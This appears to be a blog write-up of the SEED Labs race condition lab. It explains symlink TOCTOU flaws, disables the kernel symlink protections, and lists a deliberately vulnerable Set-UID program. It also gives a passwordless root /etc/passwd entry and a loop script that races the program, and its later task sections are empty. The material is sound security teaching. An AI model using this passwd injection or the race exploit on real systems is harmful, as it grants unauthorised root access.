---
layout:       post
title:        "SEED Labs 2.0: Race Condition Vulnerability Lab Writeup"
category:     "Computing Systems"
tags:         software-security
permalink:    /race-condition-seedlab/
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org). The lab assignment was conducted using SEED virtual machine configured on a AWS EC2 instance.

A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place. If a privileged program has a race condition vulnerability, attackers can run a parallel process to "race" against the privileged program, with an intention to change the behaviors of the program. This lab covers the following topics:

* Race condition vulnerability
* Sticky symlink[^1] protection
* Principle of least privilege

<!-- excerpt-end -->

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## Environment Setup

### Linux Filesystem: Hard Links vs. Soft Links

Index node, or inode, is a unique identifier for a specific piece of metadata on a given filesystem. Each piece of metadata describes what we think as a file. We can use the `-i` option with the `df` command following the filesystem to check the number of inodes, for example on my SEED VM:

```bash
$ df -i /dev
Filesystem     Inodes IUsed  IFree IUse% Mounted on
devtmpfs       246320   348 245972    1% /dev
```

We can also look at the inode number of a specific directory or file using the `ls -i` command:

```bash
# Check metadata information
$ stat RaceCondition
  File: RaceCondition
  Size: 4096            Blocks: 8          IO Block: 4096   directory
Device: 10301h/66305d   Inode: 1024138     Links: 2
Access: (0775/drwxrwxr-x)  Uid: ( 1001/    seed)   Gid: ( 1001/    seed)
Access: 2021-11-28 23:44:44.083029954 -0500
Modify: 2020-12-26 00:00:13.000000000 -0500
Change: 2021-11-28 23:41:42.609786930 -0500
 Birth: -
# -i (inodes), -l (long format), -d (directory)
$ ls -idl RaceCondition/
1024138 drwxrwxr-x 2 seed seed 4096 Dec 26  2020 RaceCondition/
$ cd RaceCondition
$ ls
target_process.sh  vulp.c
$ ls -i vulp.c
1024139 vulp.c
```

The `RaceCondition` directory is consuming eight sectors because, by default, block disk size is 4KiB and sector size is 512B. However, regardless of the size of the directory, it will always be referenced by the same inode address.

When a *hard link* is created, a second file that points to the exact same data as the original file is created. The two files both have the same content, permissions, and inode address. A hard link cannot point to a directory. On the contrary, a soft link, or symbolic link ("symlink" for short), acts as a pointer to the original content while not being a mirror of it and thereby can be created to point to a directory. The size of a symlink is only the number of bytes necessary to compose the name of the file or directory.

The symlink-based time-of-check-time-of-use (ToCToU) race is commonly seen in world-writable directories like `/tmp`. The following file is set to "1" by default so that symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the `uid` of the symlink and follower match, or when the directory owner matches the symlink's owner:

```bash
$ sudo cat /proc/sys/fs/protected_symlinks
1
```

The following file, when set to "2", prevents the caller of `open()` with `O_CREAT` flag from accessing any regular file that the caller does not own in both group- and world-writable sticky directories, unless the regular file is owned by the owner of the directory:

```bash
$ sudo cat /proc/sys/fs/protected_regular
2
```

In this lab, we need to disable these protections:

```bash
$ sudo sysctl -w fs.protected_symlinks=0
$ sudo sysctl fs.protected_regular=0
```

### A Vulnerable Program

```c
/** 
 * Compile and run: sudo chown root && sudo chmod 4755
 * The root-owned Set-UID program vulp.c contains a race condition vulnerability. 
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    if (!access(fn, W_OK)) {
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    return 0;
}
```

Since the program runs with its effective user ID being zero, it can overwrite any file. The function call to `access()` checks whether the real user ID has the access permission to a temporary file `/tmp/XYZ`. If so, the program opens the file `/tmp/XYZ` and appends a string of user input to the end of it. Due to the time window between `access()` (the check) and `fopen()` (the use), there is a possibility that the file used by `access()` is different from the file used by `fopen()`, even though they have the same file name "`/tmp/XYZ`". If a malicious attacker can somehow makes `/tmp/XYZ` a symlink pointing to a protected file, say `/etc/passwd`, within the time window, the attacker can cause the user input to be appended to `/etc/passwd`, and can thus gain the root privilege.

## Task 1: Choosing Our Target

We choose to target the password file `/etc/passwd`, which is not writable by normal users. Inside the password file, each user has an entry that consists of seven fields separacted by colons (`:`). For the root user:
```bash
# To verify this, run "sudo cat /etc/passwd" and check the first line
root:x:0:0:root:/root:/bin/bash
```
the third field (user ID) has a value zero. If we want to create a user account with the root privilege, we just need to put a zero in this field. The second field (password) is set to "`x`", indicating that the password is stored in the shadow file `/etc/shadow`. Actually, the password field holds the one-way hash value of the password rather than the password itself. To get such a value for a given password, we can add a new user in our own system using the `adduser` command, and then get the one-way hash value of our password from the shadow file. Interestingly, there is a magic value used in Ubuntu live CD for a password-less account, and the magic value is:

```text
U6aMy0wojraho
```

If we put this value in the password field of a user entry, we only need to hit the `<return>` key when prompted for a password. To verify whether the magic password works or not, we manually (as a superuser) add the following entry:
```bash
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```
to the end of the `/etc/passwd` file, and try to log into the `test` account without typing a password:
```bash
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ su test
Password:
[November 29 2021] root@ip-172-31-1-54:/home/seed/Documents/RaceCondition# whoami
root
[November 29 2021] root@ip-172-31-1-54:/home/seed/Documents/RaceCondition# id
uid=0(root) gid=0(root) groups=0(root)
[November 29 2021] root@ip-172-31-1-54:/home/seed/Documents/RaceCondition# sudo nano /etc/passwd
[November 29 2021] root@ip-172-31-1-54:/home/seed/Documents/RaceCondition# su test
su: user test does not exist
[November 29 2021] root@ip-172-31-1-54:/home/seed/Documents/RaceCondition# exit
exit
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ whoami
seed
```

As we can see from above, we have the root privilege when logged in as `test`; after we delete the entry from the password file, we cannot log into the `test` account any more.

## Task 2: Launching the Race Condition Attack

### Task 2.A: Simulating a Slow Machine

Modify our `vulp` program by adding a `sleep(10)` between the `access()` and `fopen()` function calls.

```bash
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ cp vulp.c vulp_cheat.c              
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ nano vulp_cheat.c
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ gcc vulp_cheat.c -o vulp
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ sudo chown root vulp
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ sudo chmod 4755 vulp
```

First create the temporary file and then run the program:

```bash
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ touch /tmp/XYZ
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ ./vulp
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

As the program is running, open another terminal window, and type:

```bash
# -f (if the link exists, remove the old one first)
$ ln -sf /etc/passwd /tmp/XYZ
```

Then, we can check if the entry have been successfully added to the password file:

```bash
[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ sudo cat /etc/passwd
...

test:U6aMy0wojraho:0:0:test:/root:/bin/bash[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ 
```

### Task 2.B: The Real Attack

In the previous task, we have kind of "cheated" by asking the vulnerable program to slow down, so we can launch the attack. Before launching this real attack, make sure that the `sleep()` statement is removed from the `vulp` program.

The typical strategy in race condition attacks is to run the attack program in parallel to the target program, hoping to be able to do the critical step within that time window. Since the success of attack is only probabilistic, we have to run the attack many times to hit the race condition window once if the window is small. We will write a program to automate this process.

The following shell script runs the `ls -l` command at the very beginning, which outputs several pieces of information about a file, including the last modified time. By comparing the outputs of the command with the ones produced previously, we can tell whether the file has been modified or not. Then the shell script runs the `vulp` program in a loop, with the input given by the `echo` command (via a pipe). If the attack is successful, i.e., the password file is modified, the shell script will stop.

```bash
#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]          # repeatedly check if /etc/passwd is modified
do
    echo "<input string>" | ./vulp  # run the vulnerable program
    new=$($CHECK_FILE)
done
echo "STOP... The password file has been changed!"
```

### Task 2.C: An Improved Attack Method

## Task 3: Countermeasures

### Task 3.A: Applying the Principle of Least Privilege

## Notes

[^1]: 